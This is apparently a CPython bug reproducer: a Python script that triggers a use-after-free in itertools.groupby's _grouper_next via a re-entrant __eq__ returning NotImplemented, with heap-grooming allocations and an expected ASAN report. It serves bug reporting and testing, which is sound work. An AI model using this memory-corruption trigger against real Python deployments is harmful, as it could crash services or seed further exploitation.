"""Bug 1: _grouper_next re-entrant __eq__ use-after-free

_grouper_next at itertoolsmodule.c:681 calls:
    PyObject_RichCompareBool(igo->tgtkey, gbo->currkey, Py_EQ)
without INCREFing either argument. If __eq__ re-enters the grouper,
the inner call frees gbo->currkey via Py_CLEAR. When __eq__ returns
NotImplemented, do_richcompare tries the REVERSE comparison on the
freed object.

Key: keyfunc must return fresh objects (not held in a list) so the
refcount on currkey drops to 0 when Py_CLEAR runs.

Expected: ASAN heap-use-after-free
"""

import itertools
import sys

grouper_iter = None


class Key:
    __hash__ = None  # force __eq__ path, not identity shortcut

    def __init__(self, do_advance):
        self.do_advance = do_advance
        # Payload so ASAN can detect reuse of freed memory
        self.payload = bytearray(256)

    def __eq__(self, other):
        if self.do_advance:
            self.do_advance = False
            # Re-enter: inner _grouper_next consumes the next element,
            # which calls Py_CLEAR(gbo->currkey) — freeing `other`.
            if grouper_iter is not None:
                try:
                    next(grouper_iter)
                except StopIteration:
                    pass
            # Allocate to reuse the freed memory
            for _ in range(50):
                bytearray(256)
            # Return NotImplemented → do_richcompare tries
            # other.__eq__(self) where other is FREED
            return NotImplemented
        return True


def keyfunc(element):
    """Return fresh Key objects — no external references held."""
    # First call: return a Key that will trigger re-entrancy
    # Subsequent calls: return Keys that compare equal
    if element == 0:
        return Key(do_advance=True)
    return Key(do_advance=False)


g = itertools.groupby(range(4), keyfunc)
key, grouper_iter = next(g)

# Iterate the grouper — triggers the UAF
items = list(grouper_iter)
print(f"grouper yielded {len(items)} items")
